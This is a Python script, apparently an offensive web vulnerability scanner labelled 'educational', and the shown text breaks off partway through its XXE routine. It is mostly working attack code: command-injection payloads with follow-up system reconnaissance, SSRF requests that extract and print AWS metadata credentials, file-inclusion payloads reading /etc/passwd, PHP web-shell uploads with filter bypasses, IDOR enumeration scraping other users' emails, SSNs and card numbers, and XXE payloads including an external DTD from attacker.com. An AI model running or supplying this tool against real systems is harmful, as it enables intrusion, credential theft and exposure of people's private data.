#!/usr/bin/env python3
"""
Web Vulnerability Testing Tool v1.0
Educational purposes only!
"""

import requests
from bs4 import BeautifulSoup
import time
import json
import re
from datetime import datetime
import random
import base64
import threading
from urllib.parse import quote, urljoin, urlparse
from colorama import init, Fore, Back, Style
import sys
import os

# Initialize colorama
init(autoreset=True)

class WebVulnerabilityTester:
    def __init__(self):
        self.target_url = None
        self.session = requests.Session()
        self.logged_in = False
        self.username = None
        self.password = None
        self.vulnerabilities = []
        
        # 설정
        self.setup_session()
        
    def setup_session(self):
        """세션 설정"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def print_banner(self):
        """배너 출력"""
        banner = f"""
{Fore.RED}
╦ ╦┌─┐┌┐    ╦  ╦┬ ┬┬  ┌┐┌  ╔═╗┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐
║║║├┤ ├┴┐   ╚╗╔╝│ ││  │││  ╚═╗│  ├─┤││││││├┤ ├┬┘
╚╩╝└─┘└─┘    ╚╝ └─┘┴─┘┘└┘  ╚═╝└─┘┴ ┴┘└┘┘└┘└─┘┴└─
                                          v1.0
{Style.RESET_ALL}

{Fore.YELLOW}Web Vulnerability Testing Tool - Educational Purpose Only!{Style.RESET_ALL}
{Fore.CYAN}Target: {self.target_url}{Style.RESET_ALL}
{Fore.GREEN}Logged in: {self.logged_in}{Style.RESET_ALL}
"""
        print(banner)
    
    def show_menu(self):
        """메뉴 표시"""
        menu = f"""
{Fore.CYAN}{'='*60}{Style.RESET_ALL}
{Fore.GREEN}Select Vulnerability Test:{Style.RESET_ALL}

{Fore.YELLOW}[1]{Style.RESET_ALL} Command Injection       - Test OS command execution
{Fore.YELLOW}[2]{Style.RESET_ALL} SSRF                    - Server-Side Request Forgery
{Fore.YELLOW}[3]{Style.RESET_ALL} LFI/RFI                 - Local/Remote File Inclusion
{Fore.YELLOW}[4]{Style.RESET_ALL} File Upload             - Malicious file upload
{Fore.YELLOW}[5]{Style.RESET_ALL} IDOR                    - Insecure Direct Object Reference
{Fore.YELLOW}[6]{Style.RESET_ALL} XXE                     - XML External Entity
{Fore.YELLOW}[7]{Style.RESET_ALL} Path Traversal          - Directory traversal
{Fore.YELLOW}[8]{Style.RESET_ALL} SSTI                    - Server-Side Template Injection
{Fore.YELLOW}[9]{Style.RESET_ALL} Open Redirect           - URL redirection
{Fore.YELLOW}[10]{Style.RESET_ALL} Session/Cookie Test    - Session vulnerabilities

{Fore.MAGENTA}[A]{Style.RESET_ALL} Run All Tests           - Comprehensive scan
{Fore.MAGENTA}[R]{Style.RESET_ALL} Generate Report         - Create findings report
{Fore.MAGENTA}[L]{Style.RESET_ALL} Re-Login                - Login again
{Fore.MAGENTA}[H]{Style.RESET_ALL} Help                    - Show detailed help
{Fore.RED}[Q]{Style.RESET_ALL} Quit                    - Exit the tool

{Fore.CYAN}{'='*60}{Style.RESET_ALL}
"""
        print(menu)
    
    def get_target(self):
        """타겟 URL 입력받기"""
        print(f"\n{Fore.YELLOW}[*] Enter target information:{Style.RESET_ALL}")
        
        while True:
            target = input("Target IP/URL (e.g., 15.164.94.241 or http://15.164.94.241): ").strip()
            
            # http:// 추가
            if not target.startswith('http'):
                target = f"http://{target}"
            
            # 마지막 슬래시 추가
            if not target.endswith('/'):
                target += '/'
            
            # 연결 테스트
            try:
                print(f"{Fore.YELLOW}[*] Testing connection to {target}...{Style.RESET_ALL}")
                response = self.session.get(target, timeout=5)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Connection successful!{Style.RESET_ALL}")
                    self.target_url = target
                    return True
                else:
                    print(f"{Fore.RED}[-] Got status code: {response.status_code}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Connection failed: {e}{Style.RESET_ALL}")
            
            retry = input("Try again? (y/n): ").lower()
            if retry != 'y':
                return False
    
    def login(self):
        """로그인"""
        print(f"\n{Fore.YELLOW}[*] Login to target site:{Style.RESET_ALL}")
        
        self.username = input("Username: ").strip()
        self.password = input("Password: ").strip()
        
        login_url = urljoin(self.target_url, '/login.php')
        
        try:
            data = {
                'username': self.username,
                'password': self.password
            }
            
            response = self.session.post(login_url, data=data, allow_redirects=True)
            
            # 로그인 성공 확인
            if any(word in response.text.lower() for word in ['logout', 'dashboard', 'welcome']) or 'index.php' in response.url:
                print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
                self.logged_in = True
                return True
            else:
                print(f"{Fore.RED}[-] Login failed!{Style.RESET_ALL}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Login error: {e}{Style.RESET_ALL}")
            return False
    
    def test_command_injection(self):
        """Command Injection 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Command Injection...{Style.RESET_ALL}")
        
        # 일반적인 취약 엔드포인트
        endpoints = [
            ('ping.php', 'ip', 'GET'),
            ('ping.php', 'host', 'GET'),
            ('traceroute.php', 'host', 'GET'),
            ('nslookup.php', 'domain', 'GET'),
            ('whois.php', 'domain', 'GET'),
            ('system.php', 'cmd', 'GET'),
            ('execute.php', 'command', 'GET'),
            ('shell.php', 'exec', 'GET'),
            ('diagnostic.php', 'ip', 'GET'),
            ('network.php', 'target', 'GET'),
            ('tools.php', 'action', 'POST'),
            ('admin/command.php', 'cmd', 'POST'),
        ]
        
        # Command Injection 페이로드
        payloads = [
            # 기본
            ('semicolon', '127.0.0.1;whoami'),
            ('pipe', '127.0.0.1|whoami'),
            ('double_ampersand', '127.0.0.1&&whoami'),
            ('double_pipe', '127.0.0.1||whoami'),
            
            # 백틱과 $()
            ('backtick', '127.0.0.1`whoami`'),
            ('dollar', '127.0.0.1$(whoami)'),
            
            # 개행
            ('newline', '127.0.0.1\nwhoami'),
            ('encoded_newline', '127.0.0.1%0awhoami'),
            
            # 시간 기반
            ('sleep', '127.0.0.1;sleep 5'),
            ('timeout', '127.0.0.1;timeout 5'),
            
            # 공백 우회
            ('ifs', '127.0.0.1;whoami${IFS}'),
            ('tab', '127.0.0.1;whoami%09'),
        ]
        
        found_vulns = []
        
        for endpoint, param, method in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 존재 확인
            try:
                if method == 'GET':
                    test_response = self.session.get(f"{url}?{param}=127.0.0.1", timeout=3)
                else:
                    test_response = self.session.post(url, data={param: '127.0.0.1'}, timeout=3)
                
                if test_response.status_code != 200:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint} ({method} {param})...{Style.RESET_ALL}")
                
            except:
                continue
            
            # 각 페이로드 테스트
            for payload_name, payload in payloads:
                try:
                    start_time = time.time()
                    
                    if method == 'GET':
                        response = self.session.get(f"{url}?{param}={quote(payload)}", timeout=10)
                    else:
                        response = self.session.post(url, data={param: payload}, timeout=10)
                    
                    elapsed_time = time.time() - start_time
                    
                    # 취약점 확인
                    vulnerable = False
                    vuln_type = None
                    
                    # 시간 기반 확인
                    if 'sleep' in payload and elapsed_time > 4.5:
                        vulnerable = True
                        vuln_type = "Time-based"
                        print(f"{Fore.RED}[+] Time-based command injection detected! (delay: {elapsed_time:.2f}s){Style.RESET_ALL}")
                    
                    # 에러 기반 확인
                    elif any(error in response.text.lower() for error in ['uid=', 'gid=', 'groups=', 'whoami:', 'root:', 'admin:']):
                        vulnerable = True
                        vuln_type = "Output-based"
                        print(f"{Fore.RED}[+] Command output detected in response!{Style.RESET_ALL}")
                        
                        # 출력 추출
                        output = self.extract_command_output(response.text)
                        if output:
                            print(f"{Fore.GREEN}Output: {output[:100]}...{Style.RESET_ALL}")
                    
                    # 에러 메시지 확인
                    elif any(error in response.text.lower() for error in ['command not found', 'is not recognized', 'syntax error']):
                        vulnerable = True
                        vuln_type = "Error-based"
                        print(f"{Fore.RED}[+] Command error detected - injection possible!{Style.RESET_ALL}")
                    
                    if vulnerable:
                        found_vulns.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'method': method,
                            'payload': payload,
                            'type': vuln_type
                        })
                        
                        # 추가 명령 실행 테스트
                        self.exploit_command_injection(url, param, method, payload_name)
                        break
                        
                except requests.exceptions.Timeout:
                    if 'sleep' in payload or 'timeout' in payload:
                        print(f"{Fore.GREEN}[+] Timeout detected - possible command injection{Style.RESET_ALL}")
                except Exception as e:
                    pass
                
                time.sleep(0.5)
        
        # 결과 저장
        if found_vulns:
            self.vulnerabilities.extend([{
                'type': 'Command Injection',
                'details': vuln
            } for vuln in found_vulns])
            
            print(f"\n{Fore.RED}[!] Found {len(found_vulns)} command injection vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No command injection vulnerabilities found.{Style.RESET_ALL}")
    
    def extract_command_output(self, html):
        """HTML에서 명령 실행 결과 추출"""
        # 일반적인 패턴
        patterns = [
            r'<pre>(.*?)</pre>',
            r'<code>(.*?)</code>',
            r'Output:\s*(.*?)(?:</|$)',
            r'Result:\s*(.*?)(?:</|$)',
            r'uid=\d+.*?gid=\d+.*?groups=.*',
            r'([\w\-]+@[\w\-]+:[\w\/\-~]+\$)',  # Shell prompt
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        return None
    
    def exploit_command_injection(self, url, param, method, payload_type):
        """Command Injection 추가 악용"""
        print(f"\n{Fore.YELLOW}[*] Attempting to exploit command injection...{Style.RESET_ALL}")
        
        # 시스템 정보 수집 명령어
        commands = [
            ('System info', 'uname -a'),
            ('User info', 'id'),
            ('Current directory', 'pwd'),
            ('Network info', 'ifconfig || ip addr'),
            ('Process list', 'ps aux | head -20'),
            ('Installed packages', 'dpkg -l | head -20 || rpm -qa | head -20'),
        ]
        
        # 적절한 구분자 선택
        if payload_type == 'semicolon':
            separator = ';'
        elif payload_type == 'pipe':
            separator = '|'
        elif payload_type == 'double_ampersand':
            separator = '&&'
        else:
            separator = ';'
        
        for cmd_name, cmd in commands:
            payload = f"127.0.0.1{separator}{cmd}"
            
            try:
                if method == 'GET':
                    response = self.session.get(f"{url}?{param}={quote(payload)}", timeout=5)
                else:
                    response = self.session.post(url, data={param: payload}, timeout=5)
                
                output = self.extract_command_output(response.text)
                if output:
                    print(f"\n{Fore.GREEN}[{cmd_name}]:{Style.RESET_ALL}")
                    print(output[:200])
            except:
                pass
            
            time.sleep(0.5)
    
    def test_ssrf(self):
        """SSRF 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Server-Side Request Forgery (SSRF)...{Style.RESET_ALL}")
        
        # SSRF 취약 엔드포인트
        endpoints = [
            ('fetch.php', 'url'),
            ('proxy.php', 'url'),
            ('load.php', 'src'),
            ('image.php', 'src'),
            ('download.php', 'url'),
            ('curl.php', 'url'),
            ('get.php', 'url'),
            ('request.php', 'url'),
            ('api.php', 'endpoint'),
            ('webhook.php', 'callback'),
            ('preview.php', 'url'),
            ('screenshot.php', 'url'),
        ]
        
        # SSRF 페이로드
        ssrf_payloads = [
            # 로컬호스트
            ('localhost', 'http://localhost:80'),
            ('127.0.0.1', 'http://127.0.0.1:80'),
            ('0.0.0.0', 'http://0.0.0.0:80'),
            
            # 내부 네트워크
            ('internal_10', 'http://10.0.0.1'),
            ('internal_172', 'http://172.16.0.1'),
            ('internal_192', 'http://192.168.1.1'),
            
            # AWS 메타데이터
            ('aws_metadata', 'http://169.254.169.254/latest/meta-data/'),
            ('aws_creds', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
            
            # 다른 프로토콜
            ('file_protocol', 'file:///etc/passwd'),
            ('gopher', 'gopher://localhost:80'),
            
            # 인코딩/우회
            ('decimal_ip', 'http://2130706433'),  # 127.0.0.1 in decimal
            ('hex_ip', 'http://0x7f.0x0.0x0.0x1'),
            ('short_ip', 'http://127.1'),
        ]
        
        found_ssrf = []
        
        for endpoint, param in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 확인
            try:
                test_response = self.session.get(f"{url}?{param}=http://example.com", timeout=3)
                if test_response.status_code != 200:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
                
            except:
                continue
            
            for payload_name, payload in ssrf_payloads:
                try:
                    response = self.session.get(f"{url}?{param}={quote(payload)}", timeout=5)
                    
                    # SSRF 확인
                    if response.status_code == 200:
                        # AWS 메타데이터 확인
                        if 'aws_' in payload_name and any(aws_indicator in response.text for aws_indicator in ['ami-id', 'instance-id', 'AccessKeyId']):
                            print(f"{Fore.RED}[+] AWS Metadata accessible!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            
                            # AWS 키 추출 시도
                            if 'iam/security-credentials' in response.text:
                                self.extract_aws_credentials(url, param)
                            
                            found_ssrf.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': 'AWS Metadata'
                            })
                        
                        # 로컬 파일 읽기 확인
                        elif 'file_protocol' in payload_name and any(indicator in response.text for indicator in ['root:', 'bin:', '/usr/sbin/nologin']):
                            print(f"{Fore.RED}[+] Local file read via SSRF!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            found_ssrf.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': 'File Read'
                            })
                        
                        # 내부 서비스 접근 확인
                        elif len(response.text) > 500 and payload_name.startswith('internal_'):
                            print(f"{Fore.GREEN}[+] Possible internal network access{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            found_ssrf.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': 'Internal Network'
                            })
                
                except Exception as e:
                    pass
                
                time.sleep(0.5)
        
        if found_ssrf:
            self.vulnerabilities.extend([{
                'type': 'SSRF',
                'details': vuln
            } for vuln in found_ssrf])
            
            print(f"\n{Fore.RED}[!] Found {len(found_ssrf)} SSRF vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No SSRF vulnerabilities found.{Style.RESET_ALL}")
    
    def extract_aws_credentials(self, url, param):
        """AWS 자격 증명 추출"""
        print(f"\n{Fore.YELLOW}[*] Attempting to extract AWS credentials...{Style.RESET_ALL}")
        
        # IAM role 이름 획득
        role_url = f"{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        response = self.session.get(role_url)
        
        if response.status_code == 200 and response.text.strip():
            role_name = response.text.strip().split('\n')[0]
            print(f"{Fore.GREEN}[+] Found IAM Role: {role_name}{Style.RESET_ALL}")
            
            # 자격 증명 획득
            creds_url = f"{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
            creds_response = self.session.get(creds_url)
            
            if creds_response.status_code == 200:
                try:
                    creds = json.loads(creds_response.text)
                    print(f"{Fore.RED}[!] AWS Credentials Extracted!{Style.RESET_ALL}")
                    print(f"    AccessKeyId: {creds.get('AccessKeyId', 'N/A')}")
                    print(f"    SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
                    print(f"    Token: {creds.get('Token', 'N/A')[:20]}...")
                except:
                    print(f"{Fore.YELLOW}[*] Credentials found but couldn't parse{Style.RESET_ALL}")
    
    def test_lfi(self):
        """LFI/RFI 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Local/Remote File Inclusion...{Style.RESET_ALL}")
        
        # LFI 취약 엔드포인트
        endpoints = [
            ('index.php', 'page'),
            ('view.php', 'file'),
            ('include.php', 'file'),
            ('load.php', 'template'),
            ('read.php', 'doc'),
            ('download.php', 'file'),
            ('show.php', 'page'),
            ('content.php', 'page'),
            ('display.php', 'file'),
        ]
        
        # LFI 페이로드
        lfi_payloads = [
            # 기본
            ('basic', '../../../etc/passwd'),
            ('basic_win', '..\\..\\..\\windows\\win.ini'),
            
            # 인코딩
            ('double_encode', '..%252f..%252f..%252fetc%252fpasswd'),
            ('unicode', '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'),
            
            # 널 바이트
            ('null_byte', '../../../etc/passwd%00'),
            ('null_byte_ext', '../../../etc/passwd%00.jpg'),
            
            # 래퍼
            ('php_filter', 'php://filter/convert.base64-encode/resource=index.php'),
            ('php_input', 'php://input'),
            ('data_wrapper', 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='),
            
            # 로그 파일
            ('access_log', '/var/log/apache2/access.log'),
            ('error_log', '/var/log/apache2/error.log'),
            ('auth_log', '/var/log/auth.log'),
            
            # 더블 인코딩
            ('double_dots', '....//....//....//etc/passwd'),
            ('backslash', '..\\..\\..\\etc\\passwd'),
        ]
        
        found_lfi = []
        
        for endpoint, param in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 확인
            try:
                test_response = self.session.get(f"{url}?{param}=index", timeout=3)
                if test_response.status_code != 200:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
                
            except:
                continue
            
            for payload_name, payload in lfi_payloads:
                try:
                    response = self.session.get(f"{url}?{param}={quote(payload)}", timeout=5)
                    
                    # LFI 확인
                    if response.status_code == 200:
                        # Linux 파일 확인
                        if any(indicator in response.text for indicator in ['root:', 'bin:', 'daemon:', '/bin/bash']):
                            print(f"{Fore.RED}[+] LFI vulnerability found!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            print(f"    File content preview: {response.text[:200]}...")
                            
                            found_lfi.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': 'Linux File Read'
                            })
                            break
                        
                        # Windows 파일 확인
                        elif '[fonts]' in response.text or 'for 16-bit app support' in response.text:
                            print(f"{Fore.RED}[+] Windows LFI found!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            
                            found_lfi.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': 'Windows File Read'
                            })
                            break
                        
                        # PHP 소스 코드 확인 (base64)
                        elif 'php_filter' in payload_name and len(response.text) > 100:
                            try:
                                decoded = base64.b64decode(response.text).decode('utf-8')
                                if '<?php' in decoded:
                                    print(f"{Fore.RED}[+] PHP source code disclosure!{Style.RESET_ALL}")
                                    print(f"    Decoded content: {decoded[:200]}...")
                                    
                                    found_lfi.append({
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'type': 'Source Code Disclosure'
                                    })
                            except:
                                pass
                
                except Exception as e:
                    pass
                
                time.sleep(0.5)
        
        if found_lfi:
            self.vulnerabilities.extend([{
                'type': 'LFI',
                'details': vuln
            } for vuln in found_lfi])
            
            print(f"\n{Fore.RED}[!] Found {len(found_lfi)} LFI vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No LFI vulnerabilities found.{Style.RESET_ALL}")
    
    def test_file_upload(self):
        """파일 업로드 취약점 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing File Upload vulnerabilities...{Style.RESET_ALL}")
        
        # 업로드 엔드포인트
        upload_endpoints = [
            'upload.php',
            # 'file_upload.php',
            # 'upload_file.php',
            # 'avatar_upload.php',
            # 'image_upload.php',
            # 'document_upload.php',
            # 'admin/upload.php',
        ]
        
        # 테스트 파일들
        test_files = [
            # PHP 웹셸
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            
            # 이중 확장자
            ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.jpg.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            
            # 대소문자
            ('shell.PHP', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.pHp', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            
            # 특수 확장자
            ('shell.php%00.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.php;.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            
            # 이미지에 PHP 삽입
            ('image.jpg', b'\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            
            # .htaccess
            ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain'),
            
            # HTML/JS
            ('xss.html', '<script>alert(document.cookie)</script>', 'text/html'),
            ('xss.svg', '<svg onload="alert(1)">', 'image/svg+xml'),
        ]
        
        found_upload_vulns = []
        
        for endpoint in upload_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 확인
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code != 200:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint}...{Style.RESET_ALL}")
                
                # 폼 필드 찾기
                soup = BeautifulSoup(response.text, 'html.parser')
                file_inputs = soup.find_all('input', {'type': 'file'})
                
                if not file_inputs:
                    continue
                
                field_name = file_inputs[0].get('name', 'file')
                
            except:
                continue
            
            for filename, content, mime_type in test_files:
                try:
                    # 파일 준비
                    if isinstance(content, bytes):
                        files = {field_name: (filename, content, mime_type)}
                    else:
                        files = {field_name: (filename, content.encode(), mime_type)}
                    
                    # 업로드 시도
                    response = self.session.post(url, files=files, timeout=5)
                    
                    if response.status_code == 200:
                        # 업로드 성공 확인
                        if any(success in response.text.lower() for success in ['success', 'uploaded', 'saved']):
                            print(f"{Fore.GREEN}[+] File uploaded: {filename}{Style.RESET_ALL}")
                            
                            # 업로드 경로 찾기
                            upload_path = self.find_upload_path(response.text, filename)
                            
                            if upload_path:
                                # 파일 실행 테스트
                                if self.test_uploaded_file(upload_path, filename):
                                    print(f"{Fore.RED}[+] Malicious file execution confirmed!{Style.RESET_ALL}")
                                    print(f"    File: {upload_path}")
                                    
                                    found_upload_vulns.append({
                                        'endpoint': endpoint,
                                        'filename': filename,
                                        'path': upload_path,
                                        'type': 'Executable Upload'
                                    })
                            else:
                                found_upload_vulns.append({
                                    'endpoint': endpoint,
                                    'filename': filename,
                                    'path': 'unknown',
                                    'type': 'File Upload'
                                })
                
                except Exception as e:
                    pass
                
                time.sleep(0.5)
        
        if found_upload_vulns:
            self.vulnerabilities.extend([{
                'type': 'File Upload',
                'details': vuln
            } for vuln in found_upload_vulns])
            
            print(f"\n{Fore.RED}[!] Found {len(found_upload_vulns)} file upload vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No file upload vulnerabilities found.{Style.RESET_ALL}")
    
    def find_upload_path(self, response_text, filename):
        """업로드된 파일 경로 찾기"""
        # 일반적인 업로드 경로 패턴
        patterns = [
            r'uploads?/[\w\-/]*' + re.escape(filename),
            r'files?/[\w\-/]*' + re.escape(filename),
            r'images?/[\w\-/]*' + re.escape(filename),
            r'media/[\w\-/]*' + re.escape(filename),
            r'assets/[\w\-/]*' + re.escape(filename),
            r'[\w\-/]+/' + re.escape(filename),
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        
        # 직접 경로 시도
        common_paths = [
            f'file.php?name={filename}',
            # f'uploads/{filename}',
            # f'upload/{filename}',
            # f'files/{filename}',
            # f'images/{filename}',
            # f'media/{filename}',
        ]
        
        for path in common_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = self.session.head(test_url, timeout=2)
                if response.status_code == 200:
                    return path
            except:
                pass
        
        return None
    
    def test_uploaded_file(self, path, filename):
        """업로드된 파일 실행 테스트"""
        file_url = urljoin(self.target_url, path)
        
        # PHP 파일인 경우
        if any(ext in filename.lower() for ext in ['.php', '.phtml', '.php5']):
            test_url = f"{file_url}?cmd=echo%20vulnerable"
            try:
                response = self.session.get(test_url, timeout=3)
                if 'vulnerable' in response.text:
                    return True
            except:
                pass
        
        # 일반 접근 테스트
        try:
            response = self.session.get(file_url, timeout=3)
            return response.status_code == 200
        except:
            return False
    
    def test_idor(self):
        """IDOR 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Insecure Direct Object Reference (IDOR)...{Style.RESET_ALL}")
        
        # IDOR 테스트 엔드포인트
        endpoints = [
            ('profile.php', 'id', range(1, 20)),
            ('user.php', 'id', range(1, 20)),
            ('account.php', 'user_id', range(1, 20)),
            ('view.php', 'id', range(1, 20)),
            ('order.php', 'order_id', range(100, 120)),
            ('invoice.php', 'id', range(1000, 1020)),
            ('message.php', 'msg_id', range(1, 20)),
            ('document.php', 'doc_id', range(1, 20)),
            ('api/user', 'id', range(1, 20)),
            ('api/data', 'id', range(1, 20)),
        ]
        
        found_idor = []
        my_user_id = None
        
        # 먼저 자신의 ID 찾기
        profile_url = urljoin(self.target_url, 'profile.php')
        try:
            response = self.session.get(profile_url)
            # URL에서 ID 추출 시도
            if 'id=' in response.url:
                my_user_id = re.search(r'id=(\d+)', response.url).group(1)
                print(f"{Fore.YELLOW}[*] Your user ID appears to be: {my_user_id}{Style.RESET_ALL}")
        except:
            pass
        
        for endpoint, param, id_range in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
            
            accessible_ids = []
            
            for test_id in id_range:
                # 자신의 ID는 건너뛰기
                if my_user_id and str(test_id) == str(my_user_id):
                    continue
                
                try:
                    test_url = f"{url}?{param}={test_id}"
                    response = self.session.get(test_url, timeout=3)
                    
                    if response.status_code == 200:
                        # 실제 다른 사용자 데이터인지 확인
                        if any(indicator in response.text.lower() for indicator in ['email', 'username', 'name', 'phone', 'address', 'balance']):
                            # 자신의 데이터가 아닌지 확인
                            if not self.username or self.username not in response.text:
                                accessible_ids.append(test_id)
                                print(f"{Fore.GREEN}[+] Can access ID: {test_id}{Style.RESET_ALL}")
                                
                                # 민감한 정보 확인
                                sensitive_data = self.extract_sensitive_data(response.text)
                                if sensitive_data:
                                    print(f"    Found: {sensitive_data}")
                
                except Exception as e:
                    pass
                
                time.sleep(0.3)
            
            if accessible_ids:
                found_idor.append({
                    'endpoint': endpoint,
                    'parameter': param,
                    'accessible_ids': accessible_ids,
                    'total': len(accessible_ids)
                })
        
        if found_idor:
            self.vulnerabilities.extend([{
                'type': 'IDOR',
                'details': vuln
            } for vuln in found_idor])
            
            print(f"\n{Fore.RED}[!] Found {len(found_idor)} IDOR vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No IDOR vulnerabilities found.{Style.RESET_ALL}")
    
    def extract_sensitive_data(self, html):
        """민감한 데이터 추출"""
        patterns = {
            'email': r'[\w\.-]+@[\w\.-]+\.\w+',
            'phone': r'[\d\-\+\(\)]{10,}',
            'ssn': r'\d{3}-\d{2}-\d{4}',
            'credit_card': r'\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}',
        }
        
        found_data = []
        
        for data_type, pattern in patterns.items():
            matches = re.findall(pattern, html)
            if matches:
                found_data.extend([f"{data_type}: {match}" for match in matches[:2]])
        
        return ', '.join(found_data) if found_data else None
    
    def test_xxe(self):
        """XXE 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing XML External Entity (XXE)...{Style.RESET_ALL}")
        
        # XXE 테스트 엔드포인트
        endpoints = [
            'upload.php',
            'api/parse',
            'xml_upload.php',
            'import.php',
            'feed.php',
            'soap.php',
            'xmlrpc.php',
            'api.php',
        ]
        
        # XXE 페이로드
        xxe_payloads = [
            # 기본 XXE
            ('basic_xxe', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'''),
            
            # 외부 DTD
            ('external_dtd', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>test</data>'''),
            
            # 파라미터 엔티티
            ('parameter_entity', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<data>test</data>'''),
            
            # SSRF via XXE
            ('xxe_ssrf', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>'''),
        ]
        
        found_xxe = []
        
        for endpoint in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            print(f"\n{Fore.YELLOW}[*] Testing {endpoint}...{Style.RESET_ALL}")
            
            for payload_name, payload in xxe_payloads:
                try:
                    # Content-Type 헤더 설정
                    headers = {'Content-Type': 'application/xml'}
                    
                    response = self.session.post(url, data=payload, headers=headers, timeout=5)
                    
                    # XXE 확인
                    if response.status_code == 200:
                        # 파일 내용 확인
                        if any(indicator in response.text for indicator in ['root:', 'bin:', 'daemon:']):
                            print(f"{Fore.RED}[+] XXE vulnerability found!{Style.RESET_ALL}")
                            print(f"    Payload: {payload_name}")
                            print(f"    File content: {response.text[:200]}...")
                            
                            found_xxe.append({
                                'endpoint': endpoint,
                                'payload': payload_name,
                                'type': 'File Read'
                            })
                        
                        # 에러 메시지 확인
                        elif any(error in response.text.lower() for error in ['xml', 'parser', 'entity']):
                            print(f"{Fore.GREEN}[+] XML parser error - possible XXE{Style.RESET_ALL}")
                
                except Exception as e:
                    pass
                
                time.sleep(0.5)
        
        if found_xxe:
            self.vulnerabilities.extend([{
                'type': 'XXE',
                'details': vuln
            } for vuln in found_xxe])
            
